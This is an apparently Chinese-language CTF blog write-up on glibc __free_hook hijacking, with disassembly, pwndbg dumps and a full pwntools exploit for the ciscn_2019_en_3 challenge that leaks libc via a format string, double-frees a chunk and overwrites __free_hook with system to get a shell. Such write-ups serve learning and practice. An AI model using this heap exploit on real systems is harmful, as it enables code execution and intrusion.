<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>free_hook | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>free_hook</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-13T23:26:03.000Z" id="date"> 2023-09-13</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-13T15:32:01.138Z" id="updated"> 2023-09-13</time></div></span></div></div><hr><div id="post-content"><p>free_hook的调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)= atomic_forced_read (__free_hook);<br><span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>&#123;<br>(*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>对应的汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000000736F</span>4                 sub     rsp, <span class="hljs-number">8</span>          ; Alternative name is <span class="hljs-string">&#x27;cfree&#x27;</span><br>.text:<span class="hljs-number">00000000000736F</span>8                 mov     rax, cs:__free_hook_ptr<br>.text:<span class="hljs-number">00000000000736F</span>F                 mov     rax, [rax]<br>.text:<span class="hljs-number">0000000000073702</span>                 test    rax, rax<br>.text:<span class="hljs-number">0000000000073705</span>                 jz      <span class="hljs-type">short</span> loc_73710<br>.text:<span class="hljs-number">0000000000073707</span>                 mov     rsi, [rsp+<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">000000000007370</span>C                 call    rax<br></code></pre></td></tr></table></figure>
<p>free_hook的存储的位置,在 free_hook上方 -0xb58 我们可以找到满足top_chunk要求的大小<br><strong>libc-2.27.so</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p &amp;__free_hook<br>$<span class="hljs-number">2</span> = (<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)) <span class="hljs-number">0x7ffff7dcf8e8</span> &lt;__free_hook&gt;<br>pwndbg&gt; x/<span class="hljs-number">8</span>gx <span class="hljs-number">0x7ffff7dcf8e8</span> - <span class="hljs-number">0xb58</span><br><span class="hljs-number">0x7ffff7dced90</span> &lt;initial+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000004</span>	<span class="hljs-number">0x05fc5621ed6fad69</span><br><span class="hljs-number">0x7ffff7dceda0</span> &lt;initial+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcedb0</span> &lt;initial+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcedc0</span> &lt;initial+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure>
<p>伪造的fastbin的addr为0x7ffff7dced90<br>当程序可以在该位置申请chunk的时候，通过重复向top_chunk申请<br>最终覆写__free_hook的值为system的值通过free &#x2F;bin&#x2F;sh\x00的chunk,达到程序流劫持getshell。</p>
<p>修改global_max_fast<br>通过fastbin attack 使得可以申请指定大小的，包含free_hook的chunk，比如利用0x7ffff7dced98处的值，但是这里要合理去构造偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">200</span>gx <span class="hljs-number">0x7ffff7dcf8e8</span><span class="hljs-number">-0xC00</span><br><span class="hljs-number">0x7ffff7dcece8</span> &lt;lock<span class="hljs-number">.10026</span>+<span class="hljs-number">8</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcecf8</span> &lt;maxmap&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced08</span> &lt;string_space_max&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced18</span> &lt;lock&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced28</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced38</span> &lt;lock+<span class="hljs-number">8</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced48</span> &lt;phys_pages<span class="hljs-number">.8062</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced58</span> &lt;last_environ&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced68</span> &lt;envlock&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dced88</span> &lt;initial+<span class="hljs-number">8</span>&gt;:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000004</span><br><span class="hljs-number">0x7ffff7dced98</span> &lt;initial+<span class="hljs-number">24</span>&gt;:	<span class="hljs-number">0x05fc5621ed6fad69</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure>

<p>看个例题8~<br><strong>ciscn_2019_en_3</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">[*] <span class="hljs-string">&#x27;~/ciscn_2019_en_3&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    FORTIFY:  Enabled```<br></code></pre></td></tr></table></figure>
<p>程序只实现了add和delete<br>main函数里的_printf_chk能泄露libc地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x20</span>uLL);<br>_printf_chk(<span class="hljs-number">1LL</span>, buf);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your ID.&quot;</span>);<br>read(<span class="hljs-number">0</span>, s, <span class="hljs-number">8uLL</span>);<br><span class="hljs-built_in">puts</span>(s);<br></code></pre></td></tr></table></figure>
<p>_printf_chk有两个参数，第一个参数0x1代表保护级别存入寄存器rdi，第二个参数才是我们输入的格式化利用字符串%p-%p-%p存入寄存器rsi。<br>动调发现寄存器rcx存放的是read+17的地址，根据64位linux下前6个寄存器传参的习惯（rdi&#x2F;rsi&#x2F;rdx&#x2F;rcx&#x2F;r8&#x2F;r9），此处已经用了两个寄存器。<br>所以第二个%p将会打印出rcx存放的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">RCX  <span class="hljs-number">0x7ffff7af2031</span> (read+<span class="hljs-number">17</span>) ◂— cmp rax, <span class="hljs-number">-0x1000</span> <span class="hljs-comment">/* &#x27;H=&#x27; */</span><br>RDX  <span class="hljs-number">0x20</span><br>RDI  <span class="hljs-number">0x1</span><br>RSI  <span class="hljs-number">0x7fffffffe2a0</span> ◂— <span class="hljs-number">0xa61616161</span> <span class="hljs-comment">/* &#x27;aaaa\n&#x27; */</span><br>R8   <span class="hljs-number">0x11</span><br>R9   <span class="hljs-number">0x7ffff7fe1500</span> ◂— <span class="hljs-number">0x7ffff7fe1500</span><br></code></pre></td></tr></table></figure>
<p>add</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_BE9</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( dword_20204C &gt; <span class="hljs-number">16</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enough!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the size of story: &quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>  *((_DWORD *)&amp;unk_202060 + <span class="hljs-number">4</span> * dword_20204C) = v2;<br>  v0 = dword_20204C;<br>  *((_QWORD *)&amp;unk_202068 + <span class="hljs-number">2</span> * v0) = <span class="hljs-built_in">malloc</span>(v2);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please inpute the story: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;unk_202068 + <span class="hljs-number">2</span> * dword_20204C), v2);<br>  ++dword_20204C;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>delete存在UAF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_D32</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the index:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;unk_202068 + <span class="hljs-number">2</span> * v1));<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>打这个one_gadget没穿</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x4f322</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x40</span>, environ)<br>constraints:<br>[rsp+<span class="hljs-number">0x40</span>] == <span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure>
<p>最后打的是将free_hook改为system，第二个堆块写’&#x2F;bin&#x2F;sh\x00’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">[+] read        : <span class="hljs-number">0x7f8e125b6070</span><br>[+] libc_base   : <span class="hljs-number">0x7f8e124a6000</span><br>[+] sys_addr    : <span class="hljs-number">0x7f8e124f5440</span><br>[+] one_gadget  : <span class="hljs-number">0xff1c2499b322</span><br>[+] malloc_hook : <span class="hljs-number">0x7f8e12891c30</span><br>[+] free_hook   : <span class="hljs-number">0x7f8e128938e8</span><br></code></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_en_3&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./ciscn_2019_en_3&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29868</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,buf</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;Input your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;Please input the size of story: \n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;please inpute the story: \n&quot;</span>)<br>	p.sendline(buf)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;Input your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;Please input the index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>one_gadget = <span class="hljs-number">0x4f322</span><br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;%p-%p-%p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;-&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;-&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>info = <span class="hljs-built_in">int</span>(info.decode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-number">16</span>)-<span class="hljs-number">17</span><br><br>read = libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>libc_base = info-read<br><br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x4f322</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>one_gadget = libc_base + one_gadget<br><br>p.recvuntil(<span class="hljs-string">&quot;Please input your ID.\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-comment"># alloc to libc</span><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;a&quot;</span>)  <span class="hljs-comment"># 0</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<span class="hljs-comment">#double_free chunk0</span><br>add(<span class="hljs-number">0x20</span>, p64(free_hook))   <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x20</span>, p64(sys_addr))<br><span class="hljs-comment">#pause()</span><br><br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>success(<span class="hljs-string">&quot;read        : &quot;</span> + <span class="hljs-built_in">hex</span>(info))<br>success(<span class="hljs-string">&quot;libc_base   : &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>success(<span class="hljs-string">&quot;sys_addr    : &quot;</span> + <span class="hljs-built_in">hex</span>(sys_addr))<br>success(<span class="hljs-string">&quot;one_gadget  : &quot;</span> + <span class="hljs-built_in">hex</span>(one_gadget))<br>success(<span class="hljs-string">&quot;malloc_hook : &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>success(<span class="hljs-string">&quot;free_hook   : &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>p.interactive()<br><br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/07/malloc-hook/">malloc_hook Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>